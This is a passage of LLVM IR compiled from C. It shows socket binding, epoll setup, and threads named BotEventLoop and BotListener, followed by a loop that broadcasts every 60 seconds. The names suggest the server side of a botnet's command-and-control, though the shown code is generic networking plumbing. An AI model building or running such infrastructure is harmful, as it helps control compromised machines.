56:                                               ; preds = %51
  %57 = load volatile i32, i32* @listenFD, align 4
  %58 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %11, i32 0, i32 1
  %59 = bitcast %union.epoll_data* %58 to i32*
  store i32 %57, i32* %59, align 1
  %60 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %11, i32 0, i32 0
  store i32 -2147483647, i32* %60, align 1
  %61 = load volatile i32, i32* @epollFD, align 4
  %62 = load volatile i32, i32* @listenFD, align 4
  %63 = call i32 @epoll_ctl(i32 %61, i32 1, i32 %62, %struct.epoll_event* %11) #9
  store i32 %63, i32* %8, align 4
  %64 = load i32, i32* %8, align 4
  %65 = icmp eq i32 %64, -1
  br i1 %65, label %66, label %67

66:                                               ; preds = %56
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.5, i64 0, i64 0))
  call void @abort() #11
  unreachable

67:                                               ; preds = %56
  %68 = load i32, i32* %9, align 4
  %69 = add nsw i32 %68, 2
  %70 = zext i32 %69 to i64
  %71 = call i8* @llvm.stacksave()
  store i8* %71, i8** %12, align 8
  %72 = alloca i64, i64 %70, align 16
  store i64 %70, i64* %13, align 8
  br label %73

73:                                               ; preds = %77, %67
  %74 = load i32, i32* %9, align 4
  %75 = add nsw i32 %74, -1
  store i32 %75, i32* %9, align 4
  %76 = icmp ne i32 %74, 0
  br i1 %76, label %77, label %83

77:                                               ; preds = %73
  %78 = load i32, i32* %9, align 4
  %79 = add nsw i32 %78, 1
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds i64, i64* %72, i64 %80
  %82 = call i32 @pthread_create(i64* %81, %union.pthread_attr_t* null, i8* (i8*)* @BotEventLoop, i8* null) #9
  br label %73, !llvm.loop !20

83:                                               ; preds = %73
  %84 = getelementptr inbounds i64, i64* %72, i64 0
  %85 = load i32, i32* %10, align 4
  %86 = sext i32 %85 to i64
  %87 = inttoptr i64 %86 to i8*
  %88 = call i32 @pthread_create(i64* %84, %union.pthread_attr_t* null, i8* (i8*)* bitcast (i8* (i32)* @BotListener to i8* (i8*)*), i8* %87) #9
  br label %89

89:                                               ; preds = %90, %83
  br label %90

90:                                               ; preds = %89
  call void @broadcast(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0), i32 -1, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.51, i64 0, i64 0))
  %91 = call i32 @sleep(i32 60)
  br label %89
}

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #3

; Function Attrs: noreturn nounwind
declare void @exit(i32) #6

; Function Attrs: nounwind readonly willreturn
declare i32 @atoi(i8*) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal i32 @create_and_bind(i8* %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca %struct.addrinfo, align 8
  %5 = alloca %struct.addrinfo*, align 8
  %6 = alloca %struct.addrinfo*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  %10 = bitcast %struct.addrinfo* %4 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 8 %10, i8 0, i64 48, i1 false)
  %11 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 1
  store i32 0, i32* %11, align 4
  %12 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 2
  store i32 1, i32* %12, align 8
  %13 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 0
  store i32 1, i32* %13, align 8
  %14 = load i8*, i8** %3, align 8
  %15 = call i32 @getaddrinfo(i8* null, i8* %14, %struct.addrinfo* %4, %struct.addrinfo** %5)
  store i32 %15, i32* %7, align 4
  %16 = load i32, i32* %7, align 4
  %17 = icmp ne i32 %16, 0
  br i1 %17, label %18, label %23

18:                                               ; preds = %1
  %19 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %20 = load i32, i32* %7, align 4
  %21 = call i8* @gai_strerror(i32 %20) #9
  %22 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %19, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.53, i64 0, i64 0), i8* %21)
  store i32 -1, i32* %2, align 4
  br label %76

23:                                               ; preds = %1
  %24 = load %struct.addrinfo*, %struct.addrinfo** %5, align 8
  store %struct.addrinfo* %24, %struct.addrinfo** %6, align 8
  br label %25

25:                                               ; preds = %63, %23
  %26 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %27 = icmp ne %struct.addrinfo* %26, null
  br i1 %27, label %28, label %67

28:                                               ; preds = %25
  %29 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %30 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %29, i32 0, i32 1
  %31 = load i32, i32* %30, align 4
  %32 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %33 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %32, i32 0, i32 2
  %34 = load i32, i32* %33, align 8
  %35 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %36 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %35, i32 0, i32 3
  %37 = load i32, i32* %36, align 4
  %38 = call i32 @socket(i32 %31, i32 %34, i32 %37) #9
  store i32 %38, i32* %8, align 4
  %39 = load i32, i32* %8, align 4
  %40 = icmp eq i32 %39, -1
  br i1 %40, label %41, label %42

41:                                               ; preds = %28
  br label %63

42:                                               ; preds = %28
  store i32 1, i32* %9, align 4
  %43 = load i32, i32* %8, align 4
  %44 = bitcast i32* %9 to i8*
  %45 = call i32 @setsockopt(i32 %43, i32 1, i32 2, i8* %44, i32 4) #9
  %46 = icmp eq i32 %45, -1
  br i1 %46, label %47, label %48

47:                                               ; preds = %42
  call void @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.54, i64 0, i64 0))
  br label %48

48:                                               ; preds = %47, %42
  %49 = load i32, i32* %8, align 4
  %50 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %51 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %50, i32 0, i32 5
  %52 = load %struct.sockaddr*, %struct.sockaddr** %51, align 8
  %53 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %54 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %53, i32 0, i32 4
  %55 = load i32, i32* %54, align 8
  %56 = call i32 @bind(i32 %49, %struct.sockaddr* %52, i32 %55) #9
  store i32 %56, i32* %7, align 4
  %57 = load i32, i32* %7, align 4
  %58 = icmp eq i32 %57, 0
  br i1 %58, label %59, label %60

59:                                               ; preds = %48
  br label %67

60:                                               ; preds = %48
  %61 = load i32, i32* %8, align 4
  %62 = call i32 @close(i32 %61)
  br label %63

63:                                               ; preds = %60, %41
  %64 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %65 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %64, i32 0, i32 7
  %66 = load %struct.addrinfo*, %struct.addrinfo** %65, align 8
  store %struct.addrinfo* %66, %struct.addrinfo** %6, align 8
  br label %25, !llvm.loop !21

67:                                               ; preds = %59, %25
  %68 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %69 = icmp eq %struct.addrinfo* %68, null
  br i1 %69, label %70, label %73

70:                                               ; preds = %67
  %71 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %72 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %71, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.55, i64 0, i64 0))
  store i32 -1, i32* %2, align 4
  br label %76

73:                                               ; preds = %67
  %74 = load %struct.addrinfo*, %struct.addrinfo** %5, align 8
  call void @freeaddrinfo(%struct.addrinfo* %74) #9
  %75 = load i32, i32* %8, align 4
  store i32 %75, i32* %2, align 4
  br label %76

76:                                               ; preds = %73, %70, %18
  %77 = load i32, i32* %2, align 4
  ret i32 %77
}

; Function Attrs: noreturn nounwind
declare void @abort() #6

; Function Attrs: nounwind
declare i32 @epoll_create1(i32) #3

; Function Attrs: nofree nosync nounwind willreturn
declare i8* @llvm.stacksave() #7

declare i32 @fcntl(i32, i32, ...) #1

declare i32 @getaddrinfo(i8*, i8*, %struct.addrinfo*, %struct.addrinfo**) #1

; Function Attrs: nounwind
declare i8* @gai_strerror(i32) #3

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #3

; Function Attrs: nounwind
declare void @freeaddrinfo(%struct.addrinfo*) #3

attributes #0 = { noinline nounwind optnone sspstrong uwtable "frame-pointer"="all" "min-legal-vector-width"="0" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #1 = { "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #2 = { nounwind readonly willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #3 = { nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #4 = { argmemonly nofree nounwind willreturn writeonly }
attributes #5 = { nounwind readnone willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #6 = { noreturn nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #7 = { nofree nosync nounwind willreturn }
attributes #8 = { nounwind readonly willreturn }
attributes #9 = { nounwind }
attributes #10 = { nounwind readnone willreturn }
attributes #11 = { noreturn nounwind }

!llvm.module.flags = !{!0, !1, !2, !3, !4}
!llvm.ident = !{!5}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{i32 7, !"PIC Level", i32 2}
!2 = !{i32 7, !"PIE Level", i32 2}
!3 = !{i32 7, !"uwtable", i32 1}
!4 = !{i32 7, !"frame-pointer", i32 2}
!5 = !{!"clang version 13.0.1"}
!6 = distinct !{!6, !7}
!7 = !{!"llvm.loop.mustprogress"}
!8 = distinct !{!8, !7}
!9 = distinct !{!9, !7}
!10 = distinct !{!10, !7}
!11 = distinct !{!11, !7}
!12 = distinct !{!12, !7}
!13 = distinct !{!13, !7}
!14 = distinct !{!14, !7}
!15 = distinct !{!15, !7}
!16 = distinct !{!16, !7}
!17 = distinct !{!17, !7}
!18 = distinct !{!18, !7}
!19 = distinct !{!19, !7}
!20 = distinct !{!20, !7}
!21 = distinct !{!21, !7}
